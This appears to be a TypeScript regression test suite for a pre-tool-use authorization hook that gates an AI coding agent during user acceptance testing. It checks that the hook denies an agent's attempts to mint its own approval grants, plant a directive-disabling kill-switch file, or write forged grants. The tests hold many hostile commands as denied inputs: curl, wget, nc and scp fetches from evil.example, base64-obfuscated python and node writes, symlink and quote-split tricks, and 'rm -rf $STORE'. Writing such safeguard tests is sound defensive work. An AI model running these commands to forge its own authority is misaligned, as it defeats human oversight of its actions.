/**
 * Incident-sequence regression for #2944 Wave 1.
 *
 * Reproduce: active UAT → agent treats triage/swarm language as implement authority
 * → first unauthorized product edit is blocked.
 */

import { describe, expect, it } from "vitest";
import { decideHook, type HookPolicySeams } from "../hooks/dispatcher.js";
import type { VerifyResult } from "../session/verify-session-ritual.js";
import { evaluateAuthzMutation } from "./evaluate.js";
import { evidenceSatisfiesImplementationApproval } from "./origin.js";
import type { AuthzState, HumanOriginGrant, UatLease } from "./types.js";

const readyRitual: VerifyResult = {
  code: 0,
  message: "OK session ritual gated tier is fresh.",
  tier: "gated",
  statePath: "/project/.deft/ritual-state.json",
  bypassed: false,
  wouldFailCode: null,
  posture: "mutation",
  ritualStateRequired: true,
};

function readySeams(overrides: Partial<HookPolicySeams> = {}): HookPolicySeams {
  return {
    inspectRitual: () => readyRitual,
    inspectScope: () => ({
      ready: true,
      path: "xbrief/active/story.xbrief.json",
      message: "active scope ready",
    }),
    authzAudit: false,
    ...overrides,
  };
}

function activeUatState(): AuthzState {
  const lease: UatLease = {
    active: true,
    campaignId: "uat-incident-2026",
    startedAt: "2026-07-30T00:00:00Z",
    startedBy: {
      kind: "operator-cli",
      actor: "operator",
      mintedAt: "2026-07-30T00:00:00Z",
      mintedVia: "deft authz:uat-start",
      eventRef: null,
    },
    suspendedAt: null,
    note: "full UAT + defect capture",
  };
  return { schemaVersion: 1, uat: lease, activeGrantIds: [] };
}

const selfMintedFromDispatch: HumanOriginGrant = {
  schemaVersion: 1,
  id: "agent-minted",
  origin: {
    kind: "dispatch-envelope",
    actor: "agent",
    mintedAt: "2026-07-30T01:00:00Z",
    mintedVia: "allocation_context free-text",
    eventRef: null,
  },
  scope: {
    planRef: null,
    repo: null,
    branch: null,
    worktree: null,
    surfaces: ["**/*"],
    operations: ["edit", "push", "pr", "merge"],
    storyIds: [],
    issueIds: [],
    cohortId: "swarmed-defects",
  },
  semantics: { expiresAt: null, singleUse: false, usedAt: null, revokedAt: null },
};

describe("incident sequence regression (#2944)", () => {
  it("1–3: operator UAT + swarm language does not mint implement approval", () => {
    // Agent-advanced lifecycle / allocation_context is not human-origin approval.
    expect(
      evidenceSatisfiesImplementationApproval({
        xbriefStatus: "running",
        allocationContext: {
          dispatch_kind: "swarm-cohort",
          allocation_plan_id: "plan-x",
          batching_rationale: "operator said swarm these defects",
        },
        lifecycleAdvancedBy: "agent",
      }),
    ).toBe(false);
    expect(evidenceSatisfiesImplementationApproval({ grant: selfMintedFromDispatch })).toBe(false);
  });

  it("4: first unauthorized product/UI edit is blocked under active UAT", () => {
    const state = activeUatState();
    // Pure evaluate path
    const pure = evaluateAuthzMutation({
      state,
      grants: [selfMintedFromDispatch],
      op: "edit",
      path: "apps/web/src/components/Header.tsx",
    });
    expect(pure.allowed).toBe(false);
    expect(pure.reason).toMatch(/Human action required|self-authored|origin/i);

    // PreToolUse decideHook path (enforcement before execution)
    const decision = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* unauthorized UI change */",
          },
        },
      },
      readySeams({
        loadAuthzState: () => state,
        // Even if the agent wrote a self-minted grant file, filter like production store:
        loadAuthzGrants: () => [],
      }),
    );
    expect(decision.verdict).toBe("deny");
    expect(decision.code).toMatch(/^authz-/);
    expect(decision.message).toMatch(/UAT|Human action required|authz:grant/i);
  });

  it("5: continuation language does not unlock push/PR/merge under UAT", () => {
    const state = activeUatState();
    const seams = readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });

    for (const command of ["git push origin HEAD", "gh pr create --title t", "gh pr merge 1"]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
    }
  });

  it("still allows test execution and issue filing during UAT", () => {
    const state = activeUatState();
    const seams = readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: false, merge: false },
      }),
    });

    const testRun = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: { tool_name: "Bash", tool_input: { command: "pnpm test" } },
      },
      seams,
    );
    expect(testRun.verdict).toBe("allow");

    const issue = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: { command: "gh issue create --title 'UAT defect' --body 'repro'" },
        },
      },
      seams,
    );
    expect(issue.verdict).toBe("allow");
  });
});

describe("CLI self-mint via shell under UAT (#3110)", () => {
  /**
   * Residual AppSec path: classifyShellAuthzOps returned [] for authz:grant →
   * shell-op-unclassifiable fail-open → silent operator-cli mint → empty activeGrantIds
   * activated the grant → Write/push unlocked. Dispatch-envelope self-mint is covered above;
   * this suite covers the CLI/shell mint path.
   */
  it("Bash/Shell authz:grant under UAT is denied (settings), not shell-op-unclassifiable allow", () => {
    const state = activeUatState(); // activeGrantIds: []
    const seams = readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });

    for (const command of [
      "deft authz:grant -- --operations edit,push,pr,merge --cohort self --surfaces '**/*'",
      "task authz:grant -- --operations edit --cohort self",
      "deft authz:uat-suspend",
      "deft authz:uat-start -- --campaign forged",
      "deft authz:revoke -- grant-anything",
    ]) {
      for (const tool_name of ["Bash", "Shell"]) {
        const decision = decideHook(
          {
            host: "claude",
            event: "tool.before",
            projectRoot: "/project",
            payload: { tool_name, tool_input: { command } },
          },
          seams,
        );
        expect(decision.verdict, `${tool_name} ${command}`).toBe("deny");
        expect(decision.code, `${tool_name} ${command}`).toMatch(/^authz-/);
        expect(decision.code, `${tool_name} ${command}`).not.toBe("shell-op-unclassifiable");
      }
    }
  });

  it("shell write under .deft/authz/ is denied under UAT", () => {
    const state = activeUatState();
    const seams = readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });

    for (const command of [
      'echo {"schemaVersion":1} > .deft/authz/grants/evil.json',
      "cp /tmp/grant.json .deft/authz/grants/evil.json",
      "echo '{}' > \"$AUTHZ_DIR/state.json\"",
      "printf '{}' > \"$STORE\"",
      'cp /tmp/evil.json "$(echo .deft)/authz/state.json"',
      "rm -rf $STORE",
      "cd .deft && echo x > authz/state.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
    }
  });

  it("after denied authz:grant shell, Write and push remain locked (empty activeGrantIds)", () => {
    const state = activeUatState();
    const seams = readySeams({
      loadAuthzState: () => state,
      // Production store filters self-authored; agent never successfully minted.
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });

    const grantAttempt = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: {
            command:
              "deft authz:grant -- --operations edit,push,pr,merge --cohort self --surfaces '**/*'",
          },
        },
      },
      seams,
    );
    expect(grantAttempt.verdict).toBe("deny");

    const write = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* still unauthorized */",
          },
        },
      },
      seams,
    );
    expect(write.verdict).toBe("deny");
    expect(write.code).toMatch(/^authz-/);

    for (const command of ["git push origin HEAD", "gh pr create --title t", "gh pr merge 1"]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
    }
  });
});

describe("UAT residual fail-closed (#3186)", () => {
  function uatSeams() {
    const state = activeUatState();
    return readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });
  }

  it("denies kill-switch plant and policy authority mutators under UAT", () => {
    const seams = uatSeams();
    for (const command of [
      "echo > .deft-directive-disable",
      "touch .deft-directive-disable",
      "deft policy:allow-bot-merge -- --confirm",
      "task policy:allow-direct-commits -- --confirm",
      "deft policy:disable-directive -- --confirm",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies obfuscated programmatic writes under UAT (not shell-op-unclassifiable allow)", () => {
    const seams = uatSeams();
    for (const command of [
      "python3 -c \"import base64; p=base64.b64decode('LmRlZnQvYXV0aHovc3RhdGUuanNvbg==').decode(); open(p,'w').write('{}')\"",
      "node -e \"const p=Buffer.from('LmRlZnQvYXV0aHo=','base64').toString(); require('fs').writeFileSync(p+'/state.json','{}')\"",
      "python -c \"p=bytes([0x2e,0x64,0x65,0x66,0x74]).decode(); open(p+'/authz/x','w').write('x')\"",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("still allows print-only programmatic shell under UAT (not write-capable)", () => {
    const seams = uatSeams();
    const decision = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: { tool_name: "Bash", tool_input: { command: 'python -c "print(1)"' } },
      },
      seams,
    );
    // Unclassifiable non-write shell remains fail-open (host gap for push/merge only).
    expect(decision.verdict).toBe("allow");
    expect(decision.code).toBe("shell-op-unclassifiable");
  });
});

describe("UAT downloader/decoder residuals fail-closed (#3206)", () => {
  function uatSeams() {
    const state = activeUatState();
    return readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });
  }

  it("denies curl/wget/xxd/openssl plant of .deft/authz under UAT (not unclassifiable allow)", () => {
    const seams = uatSeams();
    for (const command of [
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "wget -O .deft/authz/grants/evil.json https://evil.example/g.json",
      "xxd -r - .deft/authz/grants/evil.json",
      "openssl base64 -d -out .deft/authz/grants/evil.json",
      "curl --output=.deft/authz/state.json https://evil.example/s.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies downloader plant of kill-switch under UAT; echo redirect still denied", () => {
    const seams = uatSeams();
    for (const command of [
      "curl -o .deft-directive-disable https://evil.example/x",
      "wget -O .no-deft-directive https://evil.example/x",
      "echo > .deft-directive-disable",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("forged grant plant via curl does not unlock Write under UAT", () => {
    const seams = uatSeams();
    const plant = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: {
            command: "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
          },
        },
      },
      seams,
    );
    expect(plant.verdict).toBe("deny");

    const write = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* still unauthorized after denied plant */",
          },
        },
      },
      seams,
    );
    expect(write.verdict).toBe("deny");
    expect(write.code).toMatch(/^authz-/);
  });

  it("still allows ordinary curl under UAT (non-authz dest)", () => {
    const seams = uatSeams();
    const decision = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: { command: "curl -o /tmp/out https://example.com/a" },
        },
      },
      seams,
    );
    expect(decision.verdict).toBe("allow");
    expect(decision.code).toBe("shell-op-unclassifiable");
  });

  it("denies ln/link/mklink kill-switch plant under UAT (not unclassifiable allow) (#3213)", () => {
    const seams = uatSeams();
    for (const command of [
      "ln -sf /etc/hosts .deft-directive-disable",
      "ln -s /etc/hosts .no-deft-directive",
      "link /etc/hosts .deft-directive-disable",
      "mklink .deft-directive-disable C:\\Windows\\System32\\drivers\\etc\\hosts",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies scp/aria2c/certutil + quote-split authz plant under UAT (#3213)", () => {
    const seams = uatSeams();
    for (const command of [
      "scp host:g.json .deft/authz/grants/evil.json",
      "scp host:g.json .deft/authz/grants/evil.json ; echo ok",
      "scp -o ProxyCommand=none host:g.json .deft/authz/grants/evil.json",
      "aria2c -o evil.json -d .deft/authz/grants https://evil.example/g.json",
      "certutil -urlcache -split -f https://evil.example/g.json .deft/authz/grants/evil.json",
      "cp /etc/hosts '.deft/'authz'/grants/evil.json'",
      // Contiguous cp regression
      "cp /etc/hosts .deft/authz/grants/evil.json",
      // #3206 still denied
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("forged grant plant via scp does not unlock Write under UAT (#3213)", () => {
    const seams = uatSeams();
    const plant = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: {
            command: "scp host:g.json .deft/authz/grants/evil.json",
          },
        },
      },
      seams,
    );
    expect(plant.verdict).toBe("deny");

    const write = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* still unauthorized after denied scp plant */",
          },
        },
      },
      seams,
    );
    expect(write.verdict).toBe("deny");
    expect(write.code).toMatch(/^authz-/);
  });

  it("denies archive/alt-downloader authz plant under UAT (not unclassifiable allow) (#3245)", () => {
    const seams = uatSeams();
    for (const command of [
      "tar -xf archive.tar -C .deft/authz/grants",
      "unzip -d .deft/authz/grants a.zip",
      "rclone copy remote:x .deft/authz/grants/",
      "axel -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "fetch -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "socat - OPEN:.deft/authz/grants/evil.json",
      "7z x a.7z -o.deft/authz/grants",
      "bsdtar -xf a.tar -C .deft/authz/grants",
      "lftp -e get x -o .deft/authz/grants/x",
      // #3206 / #3213 still denied
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "scp host:g.json .deft/authz/grants/evil.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies archive/alt-downloader kill-switch plant under UAT (#3245)", () => {
    const seams = uatSeams();
    for (const command of [
      "axel -o .deft-directive-disable https://evil.example/x",
      "fetch -o .deft-directive-disable https://evil.example/x",
      "rclone copy remote:x .deft-directive-disable",
      "socat - OPEN:.deft-directive-disable",
      "tar -xf a.tar .deft-directive-disable",
      "7z x a.7z -o.no-deft-directive",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("forged grant plant via tar does not unlock Write under UAT (#3245)", () => {
    const seams = uatSeams();
    const plant = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: {
            command: "tar -xf archive.tar -C .deft/authz/grants",
          },
        },
      },
      seams,
    );
    expect(plant.verdict).toBe("deny");

    const write = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* still unauthorized after denied tar plant */",
          },
        },
      },
      seams,
    );
    expect(write.verdict).toBe("deny");
    expect(write.code).toMatch(/^authz-/);
  });

  it("still allows ordinary tar extract under UAT (non-authz dest) (#3245)", () => {
    const seams = uatSeams();
    const decision = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: { command: "tar -xf archive.tar -C /tmp/out" },
        },
      },
      seams,
    );
    expect(decision.verdict).toBe("allow");
    expect(decision.code).toBe("shell-op-unclassifiable");
  });

  it("denies crypto/alt-download residual authz plant under UAT (not unclassifiable allow) (#3288)", () => {
    const seams = uatSeams();
    for (const command of [
      "gpg -o .deft/authz/grants/evil.json -d secret.gpg",
      "age -o .deft/authz/grants/evil.json -d secret.age",
      "zstd -o .deft/authz/grants/evil.json -d a.zst",
      "sftp host:g.json .deft/authz/grants/evil.json",
      "wget2 -O .deft/authz/grants/evil.json https://evil.example/g.json",
      "http -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "yt-dlp -o .deft/authz/grants/evil.json https://evil.example/v",
      "aria2 -o evil.json -d .deft/authz/grants https://evil.example/g.json",
      "mbuffer -i in.bin -o .deft/authz/grants/evil.json",
      "cpio -id -D .deft/authz/grants",
      // prior residuals stay denied
      "tar -xf archive.tar -C .deft/authz/grants",
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies crypto/alt-download residual kill-switch plant under UAT (#3288)", () => {
    const seams = uatSeams();
    for (const command of [
      "gpg -o .deft-directive-disable -d secret.gpg",
      "age -o .deft-directive-disable -d secret.age",
      "zstd -o .deft-directive-disable -d a.zst",
      "yt-dlp -o .deft-directive-disable https://evil.example/v",
      "wget2 -O .no-deft-directive https://evil.example/x",
      "http -o .deft-directive-disable https://evil.example/x",
      "mbuffer -i in.bin -o .deft-directive-disable",
      "cpio -id -D .deft-directive-disable",
      "sftp host:.deft-directive-disable",
      "aria2 -o .deft-directive-disable https://evil.example/x",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("forged grant plant via gpg does not unlock Write under UAT (#3288)", () => {
    const seams = uatSeams();
    const plant = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Bash",
          tool_input: {
            command: "gpg -o .deft/authz/grants/evil.json -d secret.gpg",
          },
        },
      },
      seams,
    );
    expect(plant.verdict).toBe("deny");

    const write = decideHook(
      {
        host: "claude",
        event: "tool.before",
        projectRoot: "/project",
        payload: {
          tool_name: "Write",
          tool_input: {
            file_path: "/project/apps/web/src/components/Header.tsx",
            content: "/* still unauthorized after denied gpg plant */",
          },
        },
      },
      seams,
    );
    expect(write.verdict).toBe("deny");
    expect(write.code).toMatch(/^authz-/);
  });

  it("still allows ordinary residual-bin dest under UAT (non-authz) (#3288)", () => {
    const seams = uatSeams();
    for (const command of [
      "gpg -o /tmp/out.json -d secret.gpg",
      "zstd -o /tmp/out -d a.zst",
      "cpio -id -D /tmp/out",
      "yt-dlp -o /tmp/out https://example.com/v",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: {
            tool_name: "Bash",
            tool_input: { command },
          },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("allow");
      expect(decision.code, command).toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual writer authz plant under UAT (not unclassifiable allow) (#3354)", () => {
    const seams = uatSeams();
    for (const command of [
      "nc -o .deft/authz/grants/evil.json evil.example 80",
      "netcat -o .deft/authz/grants/evil.json evil.example 80",
      "7zz x a.7z -o.deft/authz/grants",
      "msgfmt -o .deft/authz/grants/evil.json messages.po",
      "msgcat -o .deft/authz/grants/evil.json a.po",
      "lz4 -o .deft/authz/grants/evil.json a.lz4",
      "lzop --output .deft/authz/grants/evil.json a.lzo",
      "unrar x archive.rar .deft/authz/grants",
      "aunpack -X .deft/authz/grants archive.tar",
      "ftpget evil.example .deft/authz/grants/evil.json remote.json",
      "sqlite3 db.sqlite .output .deft/authz/grants/evil.json",
      "crane pull ghcr.io/evil/g:latest .deft/authz/grants/evil.json",
      "objcopy src.bin .deft/authz/grants/evil.json",
      "weirdbin -o .deft/authz/grants/evil.json",
      // already-denied #3336 peers
      "ncat -o .deft/authz/grants/evil.json evil.example 80",
      "7z x a.7z -o.deft/authz/grants",
      "msguniq -o .deft/authz/grants/evil.json messages.po",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual writer kill-switch plant under UAT (#3354)", () => {
    const seams = uatSeams();
    for (const command of [
      "nc -o .deft-directive-disable evil.example 80",
      "7zz x a.7z -o.deft-directive-disable",
      "msgfmt -o .no-deft-directive messages.po",
      "lz4 -o .deft-directive-disable a.lz4",
      "sqlite3 db.sqlite .output .deft-directive-disable",
      "objcopy src.bin .no-deft-directive",
      "unknownwriter --output .deft-directive-disable",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("still allows ordinary residual-bin dest under UAT (non-authz) (#3354)", () => {
    const seams = uatSeams();
    for (const command of [
      "nc -o /tmp/out example.com 80",
      "7zz x a.7z -o/tmp/out",
      "msgfmt -o /tmp/out messages.po",
      "sqlite3 db.sqlite .output /tmp/out",
      "objcopy src.bin /tmp/out",
      "weirdbin -o /tmp/out",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: {
            tool_name: "Bash",
            tool_input: { command },
          },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("allow");
      expect(decision.code, command).toBe("shell-op-unclassifiable");
    }
  });
});

describe("UAT residual dest-form writers fail-closed (#3382)", () => {
  function uatSeams() {
    const state = activeUatState();
    return readySeams({
      loadAuthzState: () => state,
      loadAuthzGrants: () => [],
      loadRuntimeAuthority: () => ({
        enabled: false,
        allowPaths: [],
        denyPaths: [],
        scopes: { edits: true, push: true, merge: true },
      }),
    });
  }

  it("denies residual dest-form authz plant under UAT (not unclassifiable allow) (#3382)", () => {
    const seams = uatSeams();
    for (const command of [
      "cmake -E copy src.json .deft/authz/grants/evil.json",
      "script -q .deft/authz/grants/evil",
      "gallery-dl -d .deft/authz/grants https://evil.example/g",
      "megadl --path .deft/authz/grants https://mega.nz/evil",
      "ncftpget evil.example .deft/authz/grants/evil.json remote.json",
      "git apply --directory=.deft/authz/grants p.diff",
      "svn export https://evil.example/repo .deft/authz/grants/evil",
      "fossil open repo.fossil .deft/authz/grants/evil",
      "ed .deft/authz/grants/evil.json",
      "nvim .deft/authz/grants/evil.json",
      "nano .deft/authz/grants/evil.json",
      "unknownwriter --directory .deft/authz/grants",
      // already-denied #3354 peers
      "curl -o .deft/authz/grants/evil.json https://evil.example/g.json",
      "nc -o .deft/authz/grants/evil.json evil.example 80",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Bash", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("denies residual dest-form kill-switch plant under UAT (#3382)", () => {
    const seams = uatSeams();
    for (const command of [
      "cmake -E copy src .deft-directive-disable",
      "script -q .no-deft-directive",
      "gallery-dl -d .deft-directive-disable https://evil.example/x",
      "megadl --path .deft-directive-disable https://mega.nz/x",
      "ncftpget evil.example .no-deft-directive remote.json",
      "git apply --directory .deft-directive-disable p.diff",
      "svn export https://evil.example/repo .deft-directive-disable",
      "nvim .no-deft-directive",
      "unknownwriter --path=.deft-directive-disable",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: { tool_name: "Shell", tool_input: { command } },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("deny");
      expect(decision.code, command).toMatch(/^authz-/);
      expect(decision.code, command).not.toBe("shell-op-unclassifiable");
    }
  });

  it("still allows ordinary residual dest-form dest under UAT (non-authz) (#3382)", () => {
    const seams = uatSeams();
    for (const command of [
      "cmake -E copy src.json /tmp/out",
      "script -q /tmp/out",
      "gallery-dl -d /tmp/out https://example.com/a",
      "megadl --path /tmp/out https://mega.nz/a",
      "ncftpget example.com /tmp/out remote.json",
      "git apply --directory /tmp/out p.diff",
      "svn export https://example.com/repo /tmp/out",
      "nvim /tmp/out",
      "unknownwriter --directory /tmp/out",
    ]) {
      const decision = decideHook(
        {
          host: "claude",
          event: "tool.before",
          projectRoot: "/project",
          payload: {
            tool_name: "Bash",
            tool_input: { command },
          },
        },
        seams,
      );
      expect(decision.verdict, command).toBe("allow");
      expect(decision.code, command).toBe("shell-op-unclassifiable");
    }
  });
});
